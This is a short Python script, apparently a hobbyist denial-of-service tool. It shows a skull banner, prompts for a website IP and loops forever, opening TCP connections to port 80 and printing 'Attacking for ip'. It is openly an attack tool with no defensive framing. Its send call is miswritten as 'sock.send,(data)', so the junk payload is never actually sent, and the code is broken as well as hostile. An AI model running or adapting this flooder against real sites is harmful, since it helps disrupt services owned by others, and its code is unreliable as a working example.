A =  ' \033[1;31m'   #احمر 
B =  ' \033[1;32m'   #اخضر
D =  ' \033[1;34m'  #بنفسجي  
print( A+""" 
                   .- -- ----. 
                  /            \  
                 (              )
                 |,  .-.  .-.  ,|        
                 | )(_ /  \ _)( |
                 |/     /\     \|    
       (@_       <__    ^^    __>         
_      ) \_______\__|IIIIII|__/________________
(_)@8@8{}<_______________________________________>
        )_/         \ IIIIII /              
       (@            --------          

       """ +D)
import socket
ip=input("Enter ip website: ")
while True:
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    socket.setdefaulttimeout(1)
    conn=sock.connect((ip,80))
    data="jdksjdkdjskjkdjskjdksjdksjdskkdsj"*1000
    sock.send,(data)
    print ("Attacking for ip",ip,"port 80")



